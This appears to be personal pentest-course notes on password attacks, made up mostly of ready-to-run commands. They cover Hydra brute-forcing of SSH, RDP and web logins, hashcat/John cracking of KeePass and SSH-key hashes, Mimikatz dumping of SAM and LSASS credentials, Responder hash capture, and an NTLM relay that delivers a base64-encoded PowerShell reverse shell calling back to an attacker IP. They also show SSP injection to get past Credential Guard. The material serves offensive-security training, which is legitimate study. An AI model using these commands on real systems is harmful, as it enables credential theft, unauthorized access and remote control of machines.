
can use tools like `hash-identifier` and `hash-id` on kali to identify the types of hash being used.
##### USERNAME FILES
```
/usr/share/wordlists/dirb/others/names.txt
```
##### HASHCAT RULES
```
ls -la /usr/share/hashcat/rules/
```
### HYDRA
BF SSH USING PWD LIST
```
hydra -l <single_username> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://192.168.50.201
```
BF RDP USING USER LIST AND SINGLE PWD
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "PASSWORD" rdp://192.168.50.202
```


#### HTTP POST LOGIN FORM
cmd to attack using a http post login form
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
this works for base64 
```
hydra -I -L wordlists.txt -P wordlists.txt 'http-post-form://192.168.238.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:F=403'    
```


if the login is a `basic HTTP AUTH`, we can run using this cmd
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.192.201 http-get /
```



### ADDING PWD RULES

Since many users simply append a "1" to a password that requires a numerical value, let's create a rule file containing **$1** to append a "1" to all passwords in our wordlist.

```
echo \$1 > demo.rule
```

below is the rule to capitalise first letter, add 1 to the end as well as a $
```
cat demo1.rule     
```
`$1 c $!`

```
kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
```
and we get this mutated wordlist
```
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!
```

can acess custom rules by hashcat using 
```
ls -la /usr/share/hashcat/rules/
```

cmd used to crack md5 hash given custom rules
```
hashcat -m 0 md5-hash /usr/share/wordlists/rockyou.txt -r demo.rule
```

 As before, we'll use the **c** rule function for the capitalization of the first letter. Furthermore, we also use "!" again as special character. For the numerical values we'll append the (ever-popular) "1", "2", and "123" followed by the special character.
```
cat crackme.txt
```
```
cat demo3.rule
```
cracking hashs using rules
```
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```


### KEEPASS PASSWORD MANAGER
CMD TO LOOK FOR KDBX DB FOR KEEPASS
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
CONVERT THE KDBX to a hash
```
keepass2john Database.kdbx > keepass.hash
```

In our case, the JtR script prepended the filename _Database_ to the hash, which in this case the script inserted as the username associated with the target hash. This is helpful when cracking database hashes, since we want the output to contain the corresponding username and not only the password. Since KeePass uses a master password without an associated username, we'll remove the "Database:" string with a text editor.

After removing the "Database:" string, the hash is in the correct format for Hashcat:

cmd to find keepass hash
```
hashcat --help | grep -i "KeePass"
```
cracking keepass hash using rockyou with a custo rockyou rule in hashcat
```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```


## SSH Private Key Passphrase

```
ssh2john id_rsa > ssh.hash
```

hashcat mode for ssh
```
hashcat -h | grep -i "ssh"
```
hashcat rule
```
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
run the cracking using
```
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```
without rule 
```
hashcat -m 22921 ssh.hash ssh.passwords --force
```

switching to john
rules needed for jtr
```
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
and add it to the jtr conf file
```
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```
and then run the hash cracker
```
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```


# Working with Password Hashes

### Cracking NTLM
start mimikatz using 
```
.\mimikatz.exe
```
then run the below 2 commands
```
privilege::debug
```
then we run
```
token::elevate
```
and should get `impersonated!` as the output
then we run this to display the ntlm hashes
```
lsadump::sam
```
#### Cracking NTLM
Run this cmd to check the correct mode
```
hashcat --help | grep -i "ntlm"
```
run the below cmd to crack the ntlm hash
```
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Passing NTLM Hashes
First, we open up mimikatz and run the following-
```
privilege::debug
```
```
token::elevate
```
```
lsadump::sam
```

##  Cracking Net-NTLMv2


If we've obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server, and using a tool called responder, capture the hash. 

Start a listener and connect to the target machine
```
nc 192.168.50.211 4444
```
run `whoami`, and then which ever user u find, run
```
net user <user-found>
```

setting up responder
We'll need to run **ip a** to retrieve a list of all interfaces
```
ip a
```

Then, we'll run **responder** as **sudo** to enable permissions needed to handle privileged raw socket operations for the various protocols.
```
sudo responder -I tap0
```
if tap0 doesnt exist we can use
```
sudo responder -I tun0
```
Our next step is to request access to a non-existent SMB share on our Responder SMB server using the bind shell we had in the first place.
in the nc terminal run this 
```
dir \\192.168.119.2\test
```
![[Pasted image 20250604153511.png]]
, then copy the hash and crack using hashcat
run the below to see which `hascat` version to use
```
hashcat --help | grep -i "ntlm"
```
and crack using this cmd
```
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

can also capture the hash by running 
```
impacket-smbserver share ~/smbshare -smb2support
```
and sending the auth req


## Relaying Net-NTLMv2

starting the impacket ntlm relay module, where -t is the target ip, and -c is the command 
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc <encoded-cmd>"
```

 
Then follow the below cmds to encode it using powershell
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.207",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' 
```
```
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```
```
$EncodedText =[Convert]::ToBase64String($Bytes) 
```
```
$EncodedText
```

START THE LISTENER USING 
```
nc -nvlp 8080
```

from the shell with the existing account,
```
dir \\<KALI-IP>\test
```


### AVOIDING Windows Credential Guard

```
Get-ComputerInfo
```
![[Pasted image 20250728224736.png]]
With the terminal open we'll navigate to **C:\tools\mimikatz\** and run **mimikatz.exe**. Once Mimikatz is launched, we'll enable the SeDebugPrivilege for our local user and dump all the available credentials with **sekurlsa::logonpasswords**.
![[Pasted image 20250728224810.png]]
The output shows that while we know the _Administrator_ user of the _CORP.COM_ domain has logged into this box, we can't obtain the cached hashes because the LSASS process only has access to this information after it has been encrypted by the LSAISO process.

Going back to our RDP session on the CLIENTWK245 machine, we had just attempted to dump the cached hash of the _CORP\Administrator_ user which did not work because Credential Guard was enabled.

Let's try to inject an SSP instead using the **misc::memssp** command.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)
```

> Listing 64 - Injecting a malicious SSP using Mimikatz

The output shows that the SSP has been injected.

NOW WE NEED ANOTHER ADMIN TO LOG IN TO CAPTURE ITS HASH

After we successfully authenticate to the machine over RDP, we close the current RDP window and connect to the CLIENTWK245 machine once more to investigate the results of our malicious SSP. This time we will use the _offsec_ user, which is a local administrator, with the _lab_ password.

When injecting a SSP into _LSASS_ using Mimikatz, the credentials will be saved in a log file, **C:\Windows\System32\mimilsa.log**.

We'll start the Windows _Terminal_ as administrator by clicking on the Windows icon in the taskbar and typing "terminal". We'll right click on _Terminal_ and select the _Run as Administrator_, then confirm the _User Account Control_ (UAC) popup window by clicking _Yes_.

Once the terminal is open, we will check the contents of the **mimilsa.log** file.

```
type C:\Windows\System32\mimilsa.log
```
